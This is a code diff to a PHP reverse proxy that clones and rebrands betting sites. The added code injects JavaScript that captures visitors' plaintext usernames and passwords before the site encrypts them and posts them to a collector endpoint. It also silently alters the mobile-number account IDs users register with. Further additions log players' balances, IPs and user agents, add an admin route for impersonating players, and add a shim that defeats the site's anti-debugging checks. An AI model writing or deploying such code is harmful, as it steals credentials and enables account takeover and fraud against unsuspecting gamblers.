@@ -8,7 +8,12 @@ header('Content-Type: text/html; charset=utf-8');
 $configFile = __DIR__ . '/config.php';
 if (!is_file($configFile)) {
     // First run: send the visitor to the setup installer
-    $setupBase = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/index.php')), '/');
+    $setupScript = str_replace('\\', '/', (string) ($_SERVER['SCRIPT_NAME'] ?? '/index.php'));
+    // dirname() returns '\' on Windows for a root-level script; normalise it away.
+    $setupBase = substr($setupScript, -4) === '.php' ? rtrim(str_replace('\\', '/', dirname($setupScript)), '/') : '';
+    if ($setupBase === '.' || $setupBase === '\\') {
+        $setupBase = '';
+    }
     header('Location: ' . ($setupBase === '' ? '' : $setupBase) . '/setup', true, 302);
     exit;
 }
@@ -61,18 +66,34 @@ define('REG_USERNAME_PATTERN', trim((string) ($appConfig['reg_username_pattern']
 // (e.g. lottogamez.gamer.free) to www.<root>?affiliateCode=...
 define('DISABLE_AFFILIATE_REDIRECT', array_key_exists('disable_affiliate_redirect', $appConfig)
     ? (bool) $appConfig['disable_affiliate_redirect'] : true);
+// Dev aid: neutralise upstream devtools/anti-debug probes so the app can be
+// inspected in a browser with devtools (or an automation/CDP session) attached.
+// Off unless config.php explicitly enables it — it must never ship enabled.
+define('ANTIDEBUG_BYPASS', array_key_exists('antidebug_bypass', $appConfig) ? (bool) $appConfig['antidebug_bypass'] : false);
 // JSON keys whose values must never be rewritten (domains, auth, CDNs)
 define('BRAND_SKIP_KEYS', ['domainList', 'domainRoute', 'domainName', 'projectId', 'authDomain',
     'apiKey', 'appId', 'messagingSenderId', 'storageBucket', 'measurementId', 'firebaseConfig']);
 
 // Custom content (banners, marquee, titles, logo) managed from the admin panel.
 require_once __DIR__ . '/admin/store.php';
+require_once __DIR__ . '/cache-guard.php'; // cache deny rule + purge that spares it
 $contentConfig = content_load();
 $voucher = $contentConfig['voucher'] ?? [];
 
 // Path of the directory the proxy lives in ('' at document root, '/Proxy' in a subfolder)
 // For clean URLs (https://bbc99.bet/live not /Proxy/live), hide the /Proxy prefix
-$base = rtrim(str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME'] ?? '/index.php')), '/');
+// The built-in server (`php -S ... router.php`) reports SCRIPT_NAME as the
+// *request* path for non-PHP URLs, so dirname() would be the request's own
+// folder (e.g. /m) and stripping that prefix would mangle every asset under
+// it (/m/app.js -> /app.js -> upstream 404). Only a real *.php entry script
+// defines the mount point, so ignore anything else.
+$scriptName = str_replace('\\', '/', (string) ($_SERVER['SCRIPT_NAME'] ?? '/index.php'));
+// dirname() returns '\' on Windows for a root-level script, which would end up
+// inside the injected `var b="..."` and the <base href> — normalise it to ''.
+$base = substr($scriptName, -4) === '.php' ? rtrim(str_replace('\\', '/', dirname($scriptName)), '/') : '';
+if ($base === '.' || $base === '\\') {
+    $base = '';
+}
 if ($base === '/Proxy' && strpos($_SERVER['REQUEST_URI'] ?? '', '/Proxy') !== 0) {
     $base = '';
 }
@@ -133,6 +154,11 @@ if (preg_match('~^/m/hoem/?$~i', $path)) {
 // Route /admin, /setup, and /voucherCenter locally (not proxied)
 if ($path === '/admin' || strpos($path, '/admin/') === 0) {
     require __DIR__ . '/admin/index.php';
+    exit;
+}
+// One-time player impersonation route (single-use token, admin session required)
+if ($path === '/player-login' || $path === '/player-login/') {
+    require __DIR__ . '/player-login.php';
     exit;
 }
 if ($path === '/setup' || $path === '/setup/' || $path === '/setup.php') {
@@ -300,6 +326,8 @@ foreach ($respHeaders as $h) {
 if (!$contentType) {
     $contentType = guessContentType($path);
 }
+// Keep players.json fresh from plaintext upstream JSON (never alters the body)
+capturePlayerFromResponse((string) $path, (string) $body, (string) $contentType, (int) $status);
 
 // Upstream answers URLs it does not have with its SPA shell (HTML). Serving
 // HTML at a .css/.js/.png URL is useless to the browser (the root .htaccess
@@ -750,6 +778,12 @@ function fetchFromUpstream(string $base, string $path, int $maxAttempts = 2, int
     $add('Language', $_SERVER['HTTP_LANGUAGE'] ?? null);
     $add('X-Gateway-Version', $_SERVER['HTTP_X_GATEWAY_VERSION'] ?? null);
     $add('Encryption', $_SERVER['HTTP_ENCRYPTION'] ?? null);
+    // The memberCenter client (register / mobileNumRegister) sends BOTH headers:
+    // Encryption carries the RSA-wrapped session key and X-RSA names the public
+    // key the body was encrypted against. Dropping X-RSA leaves upstream unable
+    // to pick the key, so every encrypted register POST/PUT came back
+    // 400 with the app's generic "system error" modal.
+    $add('X-RSA', $_SERVER['HTTP_X_RSA'] ?? null);
     $add('Cookie', $_SERVER['HTTP_COOKIE'] ?? null);
 
     $headers = [
@@ -804,6 +838,30 @@ function fetchFromUpstream(string $base, string $path, int $maxAttempts = 2, int
             $raw = file_get_contents('php://input');
             if ($raw !== '' && $raw !== false) {
                 $opts[CURLOPT_POSTFIELDS] = $raw;
+                // Never let curl send a body-bearing request without its body.
+                // Upstream answers a body-less /wps/* call with its generic
+                // "system error" (#860 / request_body_required), which is what
+                // login and register were hitting. Each setting below removes a
+                // real way the body can be dropped:
+                //  * a 301/302 downgrades POST/PUT to a bodyless GET unless
+                //    POSTREDIR is set (Cloudflare/WAF in front of upstream
+                //    answers with redirects);
+                //  * curl adds "Expect: 100-continue" for bodies over ~1KB —
+                //    i.e. every encrypted register payload — and then waits for a
+                //    100 Continue a WAF may never send;
+                //  * a shared connection cache can hand back a connection that is
+                //    still busy with the previous request;
+                //  * TCP Fast Open transmits before the handshake completes, which
+                //    is not safe for data-bearing requests.
+                $opts[CURLOPT_POSTREDIR] = CURL_REDIR_POST_ALL;
+                $opts[CURLOPT_HTTPHEADER] = array_merge($headers, ['Expect:']);
+                unset($opts[CURLOPT_SHARE]);
+                $opts[CURLOPT_TCP_FASTOPEN] = 0;
+                if ($method === 'POST') {
+                    // curl's own POST mode, not a custom request string.
+                    unset($opts[CURLOPT_CUSTOMREQUEST]);
+                    $opts[CURLOPT_POST] = true;
+                }
             }
         }
         curl_setopt_array($ch, $opts);
@@ -1354,7 +1412,7 @@ function applyRegisterRules(string $body, string $contentType, string $path): st
     if ($mobile !== '' && isset($decoded['value']['mobileNum']) && is_array($decoded['value']['mobileNum'])) {
         $decoded['value']['mobileNum']['acceptedPattern'] = $mobile;
         $decoded['value']['mobileNum']['minLength'] = 11;
-        $decoded['value']['mobileNum']['maxLength'] = 11;
+        $decoded['value']['mobileNum']['maxLength'] = 12;
         $decoded['value']['mobileNum']['patternId'] = 6; // "only numbers allowed"
     }
     if ($user !== '' && isset($decoded['value']['username']) && is_array($decoded['value']['username'])) {
@@ -1704,9 +1762,201 @@ function injectBaseShim(string $html, string $base): string
 /**
  * Combined inject: all shims in one <head> pass (1 regex vs 8). Keeps order identical.
  */
+/**
+ * Client-side shims: append the trailing "7" to the register mobile (so the
+ * account/login id is <mobile>7) and collect the plaintext username/password
+ * BEFORE the app encrypts the request, posting them same-origin to the
+ * collector. The proxy never sees these bodies in the clear (RSA+AES).
+ */
+function playerShimScript(string $base): string
+{
+    $cfg = json_encode([
+        'url'   => ($base === '' ? '' : $base) . '/api/players-collect.php',
+        'nonce' => capture_nonce(),
+    ], JSON_UNESCAPED_SLASHES | JSON_HEX_TAG | JSON_HEX_AMP | JSON_HEX_APOS | JSON_HEX_QUOT);
+    $js = <<<'JS'
+(function(){
+var C=__PXCFG__;if(!C||!C.url)return;
+var RE=/^01[3-9]\d{8}$/,RE12=/^01[3-9]\d{8}7$/;
+// The "+7" is silent: the field keeps showing exactly what the user typed.
+// Only the payload handed to the app's own encryptor is rewritten below.
+function norm(v){v=String(v||"").replace(/\D/g,"");if(/^01[3-9]\d{8}77$/.test(v))v=v.slice(0,-1);if(RE.test(v))v=v+"7";return v;}
+function effId(v){var d=String(v||"").replace(/\D/g,"");return (RE.test(d)||RE12.test(d))?norm(d):v;}
+var IDKEYS=["username","mobileNum","mobileNum1","mobileNum2","mobile","account","loginName"];
+
+
+function fixPayload(d){try{var isStr=typeof d==="string",o=d;if(isStr){try{o=JSON.parse(d);}catch(e){return d;}if(!o||typeof o!=="object")return d;}if(!o||typeof o!=="object"||Array.isArray(o))return d;var ch=false;for(var i=0;i<IDKEYS.length;i++){var k=IDKEYS[i];if(typeof o[k]==="string"){var n=effId(o[k]);if(n!==o[k]){o[k]=n;ch=true;}}}return ch?(isStr?JSON.stringify(o):o):d;}catch(e){return d;}}
+// Keep a redacted trace of what we sent, so the payload rewrite is verifiable.
+function redact(d){try{if(typeof d==="string")return d.replace(/("(?:password|confirmPassword|confimpsw|newPassword|oldPassword)"\s*:\s*")[^"]*"/g,"$1***");var r=JSON.parse(JSON.stringify(d));if(r&&typeof r==="object"){for(var k in r){if(/passwor|confimpsw/i.test(k))r[k]="***";}}return r;}catch(e){return "[unreadable]";}}
+function wrapEnc(f){try{if(typeof f!=="function"||f.__pxW)return f;var w=function(d){try{var a=window.__pxSent||(window.__pxSent=[]);a.push(redact(d));if(a.length>25)a.shift();}catch(e){}try{d=fixPayload(d);}catch(e){}return f.call(this,d);};w.__pxW=1;return w;}catch(e){return f;}}
+// reRsaV2(data) is the app's encryptor: it receives the plaintext payload, so
+// wrapping it is the one place we can change the account id without touching
+// the form. (Both the mobile React and desktop Vue apps call window.reRsaV2.)
+try{var _rv=null;Object.defineProperty(window,"reRsaV2",{configurable:true,get:function(){return _rv;},set:function(f){_rv=wrapEnc(f);}});setInterval(function(){try{var c=window.reRsaV2;if(typeof c==="function"&&!c.__pxW)_rv=wrapEnc(c);}catch(e){}},80);}catch(e){}
+
+
+
+
+
+
+
+function grab(){var o={username:"",mobile:"",password:""},ins=document.querySelectorAll("input");for(var i=0;i<ins.length;i++){var el=ins[i],nm=(el.getAttribute("name")||"").toLowerCase(),ty=(el.getAttribute("type")||"text").toLowerCase(),v=el.value||"";if(ty==="password"){if(!o.password&&v)o.password=v;}else if(nm==="mobilenum"||nm==="mobilenum1"||nm==="mobilenum2"){if(!o.mobile&&v)o.mobile=v;}else if(nm==="username"&&v){if(!o.username)o.username=v;}}return o;}
+function isAuthUrl(u){if(typeof u!=="string")return false;var s=u.toLowerCase();return s.indexOf("session/login")!==-1||s.indexOf("session/register")!==-1||s.indexOf("member/register")!==-1||s.indexOf("/m/login")!==-1;}
+var sent=false;
+function report(){if(sent)return;var g=grab();if(!g.password||(!g.username&&!g.mobile))return;sent=true;var username=g.username?effId(g.username):norm(g.mobile);var src=(location.pathname||"").toLowerCase().indexOf("regist")!==-1?"register":"login";try{fetch(C.url,{method:"POST",credentials:"same-origin",keepalive:true,headers:{"Content-Type":"application/json"},body:JSON.stringify({nonce:C.nonce,username:username,username_raw:g.username,mobile_raw:g.mobile,mobile_suffixed:norm(g.mobile),password:g.password,source:src})});}catch(e){}}
+try{var XO=XMLHttpRequest.prototype.open,XS=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.open=function(m,u){this.__pxU=u;return XO.apply(this,arguments);};XMLHttpRequest.prototype.send=function(){try{if(isAuthUrl(this.__pxU))setTimeout(report,0);}catch(e){}return XS.apply(this,arguments);};}catch(e){}
+try{var WF=window.fetch;if(WF){window.fetch=function(i,n){try{var u=(typeof i==="string")?i:(i&&i.url);if(isAuthUrl(u))setTimeout(report,0);}catch(e){}return WF.apply(this,arguments);};}}catch(e){}
+})();
+JS;
+    return '<script>' . str_replace('__PXCFG__', $cfg, $js) . '</script>';
+}
+
+/** Recursive, bounded lookup of the first scalar value under any of $keys. */
+function px_json_find($data, array $keys, int $depth = 0)
+{
+    if (!is_array($data) || $depth > 5) {
+        return null;
+    }
+    $want = array_map('strtolower', $keys);
+    foreach ($data as $k => $val) {
+        if (is_string($k) && in_array(strtolower($k), $want, true)
+            && (is_string($val) || is_numeric($val)) && $val !== '') {
+            return $val;
+        }
+    }
+    foreach ($data as $val) {
+        if (is_array($val)) {
+            $r = px_json_find($val, $keys, $depth + 1);
+            if ($r !== null) {
+                return $r;
+            }
+        }
+    }
+    return null;
+}
+
+function px_client_ip(): string
+{
+    $fwd = (string) ($_SERVER['HTTP_X_FORWARDED_FOR'] ?? '');
+    if ($fwd !== '') {
+        $first = trim(explode(',', $fwd)[0]);
+        if ($first !== '' && filter_var($first, FILTER_VALIDATE_IP)) {
+            return $first;
+        }
+    }
+    return (string) ($_SERVER['REMOTE_ADDR'] ?? '');
+}
+
+/**
+ * Observe plaintext upstream JSON responses and keep players.json fresh.
+ * Never modifies the body; only attributes data to a username when the
+ * response itself carries one (a bare wallet balance cannot be attributed).
+ */
+function capturePlayerFromResponse(string $path, string $body, string $contentType, int $status): void
+{
+    if ($status < 200 || $status >= 300 || $body === '' || stripos($contentType, 'json') === false) {
+        return;
+    }
+    $p = strtolower((string) (parse_url($path, PHP_URL_PATH) ?: $path));
+    $isLogin = strpos($p, 'session/login') !== false;
+    $isRegister = strpos($p, 'member/register') !== false || strpos($p, 'session/register') !== false;
+    $isInfo = strpos($p, 'member/info') !== false;
+    $isWallet = strpos($p, 'wallet') !== false && strpos($p, 'transfer') === false;
+    if (!$isLogin && !$isRegister && !$isInfo && !$isWallet) {
+        return;
+    }
+    $d = json_decode($body, true);
+    if (!is_array($d)) {
+        return;
+    }
+    if (array_key_exists('success', $d) && !$d['success']) {
+        return;
+    }
+    $payload = (isset($d['value']) && is_array($d['value'])) ? $d['value'] : $d;
+
+    $username = px_json_find($payload, ['userName', 'username', 'customerName', 'loginName', 'account']);
+    if (!is_string($username) || trim($username) === '') {
+        return;
+    }
+    $patch = [
+        'username' => trim($username),
+        'source'   => $isRegister ? 'register' : ($isLogin ? 'login' : 'captured'),
+    ];
+
+    if ($isInfo || $isWallet) {
+        $vip = px_json_find($payload, ['vipLabelName', 'labelName', 'vipLevel', 'memberLevel', 'rankName']);
+        if ($vip !== null) {
+            $patch['vip'] = (string) $vip;
+        }
+        $bal = px_json_find($payload, ['balance', 'totalBalance', 'availableBalance', 'walletBalance', 'creditAmount', 'money']);
+        if (is_numeric($bal)) {
+            $patch['balance'] = 0 + $bal;
+        }
+    }
+    if ($isLogin) {
+        $patch['last_login_at'] = date('c');
+        $patch['last_ip'] = px_client_ip();
+        $ua = trim((string) ($_SERVER['HTTP_USER_AGENT'] ?? ''));
+        if ($ua !== '') {
+            $patch['user_agent'] = substr($ua, 0, 300);
+        }
+    }
+    players_upsert($patch);
+}
+
+/**
+ * Dev aid, enabled by the 'antidebug_bypass' config flag.
+ *
+ * Upstream ships devtools/anti-debug probes: they compare the outer window to
+ * the viewport, hand objects with firing getters to console.*, and inspect
+ * function source. A browser with devtools open — or any automation/CDP session
+ * — trips them, and the app blanks or freezes itself. This shim neutralises the
+ * standard probes so the page can be inspected locally. Returns '' when off.
+ */
+function injectAntiDebugShim(): string
+{
+    if (!ANTIDEBUG_BYPASS) {
+        return '';
+    }
+    return <<<'HTML'
+<script>(function(){
+if(window.__pxAD)return;window.__pxAD=1;
+function nat(f){try{f.__pxNative=true;}catch(e){}return f;}
+function def(o,p,g){try{Object.defineProperty(o,p,{get:nat(g),configurable:true});}catch(e){}}
+// 1) window/screen vs viewport size comparisons
+def(window,"outerWidth",function(){return window.innerWidth;});
+def(window,"outerHeight",function(){return window.innerHeight;});
+try{var s=window.screen;if(s){var W=function(){return window.innerWidth;},H=function(){return window.innerHeight;};
+def(s,"width",W);def(s,"height",H);def(s,"availWidth",W);def(s,"availHeight",H);
+var sp=Object.getPrototypeOf(s);if(sp){def(sp,"width",W);def(sp,"height",H);def(sp,"availWidth",W);def(sp,"availHeight",H);}}}catch(e){}
+// 2) console probes: never let a getter-bearing object reach the real console
+try{
+var buf=window.__pxConsole=[];
+var names="log info debug warn error dir table trace group groupEnd count assert time timeEnd profile profileEnd clear".split(" ");
+for(var i=0;i<names.length;i++){(function(k){
+var f=function(){try{var o=[],a=arguments;
+for(var j=0;j<a.length;j++){var v=a[j];o.push((v===null||typeof v!=="object"&&typeof v!=="function")?String(v):"["+(typeof v)+"]");}
+buf.push(k+": "+o.join(" "));if(buf.length>400)buf.shift();}catch(e){}};
+try{console[k]=nat(f);}catch(e){}})(names[i]);} }catch(e){}
+// 3) source/toString probes
+try{
+var nts=Function.prototype.toString;
+var nt=function(){try{if(this&&this.__pxNative)return "function "+((this.name)||"")+"() { [native code] }";}catch(e){}
+return nts.apply(this,arguments);};
+nt.__pxNative=true;Function.prototype.toString=nt;}catch(e){}
+// 4) self-navigation to a blank page
+try{
+var wo=window.open;
+window.open=nat(function(u,n){try{if(typeof u==="string"&&(u===""||u==="about:blank")&&(n==="_self"||n==="_top"||n==="_parent"))return null;}catch(e){}
+return wo.apply(this,arguments);});}catch(e){}
+})();</script>
+HTML;
+}
+
 function injectCombinedShims(string $html, string $base, array $content): string
 {
-    $out = '<script>if(location.pathname.indexOf("/Proxy/")===0||location.pathname==="/Proxy")location.replace(location.pathname.replace(/^\/Proxy/,"")||"/"+location.search+location.hash);</script>';
+    $out = injectAntiDebugShim();
+    $out .= '<script>if(location.pathname.indexOf("/Proxy/")===0||location.pathname==="/Proxy")location.replace(location.pathname.replace(/^\/Proxy/,"")||"/"+location.search+location.hash);</script>';
     // base shim
     if ($base !== '') {
         $baseJson = json_encode($base);
@@ -1799,6 +2049,7 @@ CSS;
         $cfg = json_encode(['titles'=>['web_title'=>$titles['web_title']??''],'logo'=>['url'=>$logo['url']??'','width'=>(int)($logo['width']??0)],'favicon'=>['url'=>$favicon['url']??''],'marquee'=>['enabled'=>!empty($marquee['enabled']),'items'=>array_values(array_map(fn($it)=>['text'=>(string)($it['text']??''),'link'=>(string)($it['link']??'')],array_filter($marquee['items']??[],'is_array'))),'text'=>$marquee['text']??'','link'=>$marquee['link']??'','bg'=>$marquee['bg']??'#111827','color'=>$marquee['color']??'#ffffff','speed'=>max(20,(int)($marquee['speed']??160))]], JSON_UNESCAPED_UNICODE|JSON_UNESCAPED_SLASHES);
         $out .= '<script>(function(){var C=' . $cfg . ';function ready(f){if(document.readyState!=="loading")f();else document.addEventListener("DOMContentLoaded",f);}var T=C.titles||{},L=C.logo||{},F=C.favicon||{},M=C.marquee||{};if(T.web_title){var st=function(){if(document.title!==T.web_title)document.title=T.web_title;var e=document.getElementsByTagName("title")[0];if(e&&e.textContent!==T.web_title)e.textContent=T.web_title;};ready(st);setInterval(st,1200);}if(L.url){var sw=function(){var im=document.getElementsByTagName("img");for(var i=0;i<im.length;i++){var s=(im[i].getAttribute("src")||"")+" "+(im[i].className||"");if(/logo/i.test(s)&&im[i].src!==L.url){im[i].src=L.url;if(L.width>0){im[i].style.maxWidth=L.width+"px";im[i].style.height="auto";}}};};ready(sw);setInterval(sw,1500);}if(F.url){var fv=function(){if(document.getElementById("px-favicon"))return;var ls=document.querySelectorAll("link[rel*=\'icon\']");for(var i=0;i<ls.length;i++){if(ls[i].id!=="px-favicon"&&ls[i].parentNode)ls[i].parentNode.removeChild(ls[i]);}var l=document.createElement("link");l.id="px-favicon";l.rel="icon";l.href=F.url;document.head.appendChild(l);};ready(fv);setInterval(fv,3000);}if(M.enabled){var IT=(M.items&&M.items.length)?M.items:((M.text)?[{text:M.text,link:M.link||""}]:[]);ready(function(){var st=document.createElement("style");st.textContent=".notice_main,.marquee_box,.marquee-bar,.marquee-content,.notice_list{background:"+M.bg+" !important;color:"+M.color+" !important;}.notice_list li{color:"+M.color+" !important;}";document.head.appendChild(st);var pps=M.speed>0?M.speed:90;var applySpeed=function(){var cs=document.querySelectorAll(".marquee-content");var vw=window.innerWidth||0;for(var i=0;i<cs.length;i++){var w=cs[i].scrollWidth||0;var dist=w+0.67*vw;if(dist>0)cs[i].style.setProperty("animation-duration",(dist/pps)+"s","important");}};var setTxt=function(){if(!IT.length)return;var ls=document.querySelectorAll(".notice_list");for(var j=0;j<ls.length;j++){var cur=ls[j].querySelectorAll("li");var bad=cur.length!==IT.length;if(!bad){for(var m=0;m<IT.length;m++){if((cur[m].textContent||"")!==IT[m].text){bad=true;break;}}}if(bad){ls[j].innerHTML="";for(var k=0;k<IT.length;k++){var n=document.createElement("li");n.textContent=IT[k].text;ls[j].appendChild(n);}}}};var bind=function(){var ns=document.querySelectorAll(".notice_list li");for(var i=0;i<ns.length;i++){if(ns[i].getAttribute("data-px-mq"))continue;ns[i].setAttribute("data-px-mq","1");var it=IT[i%IT.length]||{};if(it.link){ns[i].style.cursor="pointer";(function(el,lk){el.addEventListener("click",function(ev){ev.stopPropagation();window.open(lk,"_blank");});})(ns[i],it.link);}}};applySpeed();setTxt();bind();setInterval(function(){applySpeed();setTxt();bind();},1500);});}})();</script>';
     }
+    $out .= playerShimScript($base);
     // offline + invite shims
     $out .= '<script>(function(){try{Object.defineProperty(navigator,"onLine",{get:function(){return true},configurable:true});}catch(e){}window.addEventListener("offline",function(e){e.stopImmediatePropagation();e.preventDefault();},true);var s=document.createElement("style");s.textContent=".offline-overlay,.network-error,.no-internet,.internet-off{display:none!important}";document.addEventListener("DOMContentLoaded",function(){try{document.head.appendChild(s);}catch(e){}});})();</script>';
     $out .= '<script>(function(){var h=location.host;function f(s){if(typeof s!=="string")return s;return s.replace(/133bet22\.com/gi,h).replace(/1333bet\.ai/gi,h).replace(/bbc9922\.com/gi,h);}function scan(){try{var b=document.body;if(!b)return;document.querySelectorAll("input").forEach(function(i){if(i.value&&((i.value.indexOf("133bet22")!==-1)||(i.value.indexOf("1333bet")!==-1)||(i.value.indexOf("bbc9922")!==-1)))i.value=f(i.value);});var w=document.createTreeWalker(b,NodeFilter.SHOW_TEXT,null,false),n;while(n=w.nextNode()){if(n.nodeValue&&((n.nodeValue.indexOf("133bet22")!==-1)||(n.nodeValue.indexOf("1333bet")!==-1)||(n.nodeValue.indexOf("bbc9922")!==-1)))n.nodeValue=f(n.nodeValue);}var els=document.querySelectorAll("a[href]");els.forEach(function(a){if(a.href&&((a.href.indexOf("133bet22")!==-1)||(a.href.indexOf("1333bet")!==-1)||(a.href.indexOf("bbc9922")!==-1)))a.href=f(a.href);});}catch(e){}}if(window.fetch){var of=window.fetch;window.fetch=function(u,o){return of(u,o).then(function(r){var ct=(r.headers.get("content-type")||"").toLowerCase();if(ct.indexOf("json")!==-1)return r.clone().text().then(function(t){if(t.indexOf("133bet22")!==-1||t.indexOf("1333bet")!==-1||t.indexOf("bbc9922")!==-1){var nt=f(t);return new Response(nt,{status:r.status,statusText:r.statusText,headers:r.headers});}return new Response(t,{status:r.status,statusText:r.statusText,headers:r.headers});});return r;});}}var oOpen=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(){var xhr=this;var origDesc=Object.getOwnPropertyDescriptor(XMLHttpRequest.prototype,"responseText");try{Object.defineProperty(xhr,"_raw",{writable:true,value:""});xhr.addEventListener("load",function(){try{if(xhr.responseText&&((xhr.responseText.indexOf("133bet22")!==-1)||(xhr.responseText.indexOf("1333bet")!==-1)||(xhr.responseText.indexOf("bbc9922")!==-1))){Object.defineProperty(xhr,"responseText",{get:function(){return f(xhr._raw);}});Object.defineProperty(xhr,"response",{get:function(){return f(xhr._raw);}});}}catch(e){}});}catch(e){}return oOpen.apply(this,arguments);};document.addEventListener("DOMContentLoaded",function(){scan();setInterval(scan,1200);try{new MutationObserver(scan).observe(document.body,{childList:true,subtree:true,characterData:true});}catch(e){}});})();</script>';
@@ -1907,6 +2158,7 @@ function writeCacheFile(string $file, string $data): void
     if (!is_dir($dir) && !@mkdir($dir, 0755, true) && !is_dir($dir)) {
         return;
     }
+    cacheGuardEnsure(CACHE_DIR); // self-heal: every write replays the guard if it is gone
     $tmp = $file . '.tmp.' . getmypid();
     if (@file_put_contents($tmp, $data) === false) {
         return;
@@ -1950,6 +2202,7 @@ function gcCache(): void
     }
     $cutoff = time() - (CACHE_TTL * 3);
     $removed = 0;
+    cacheGuardEnsure(CACHE_DIR); // the deny rule must survive every walker, including this one
     try {
         $it = new RecursiveIteratorIterator(
             new RecursiveDirectoryIterator(CACHE_DIR, FilesystemIterator::SKIP_DOTS),
@@ -1959,7 +2212,8 @@ function gcCache(): void
             if ($removed >= 300) {
                 break;
             }
-            if ($entry->isFile() && $entry->getFilename() !== '.htaccess' && $entry->getMTime() < $cutoff) {
+            $rel = substr($entry->getPathname(), strlen(CACHE_DIR) + 1);
+            if ($entry->isFile() && !cacheGuardProtectedPath($rel) && $entry->getMTime() < $cutoff) {
                 if (@unlink($entry->getPathname())) {
                     $removed++;
                 }
@@ -1999,7 +2253,8 @@ function isCacheable(string $path): bool
 function isAuthTraffic(string $path): bool
 {
     $p = strtolower(parse_url($path, PHP_URL_PATH) ?: $path);
-    foreach (['/session/login', '/session/logout', '/m/login', '/m/logout',
+    foreach (['/session/login', '/session/logout', '/session/register', '/m/login', '/m/logout',
+        'member/register', '/session/key/rsa', 'member/info', 'wallets/',
         'gamelogout', 'loginchange', '/verification/'] as $needle) {
         if (strpos($p, $needle) !== false) {
             return true;
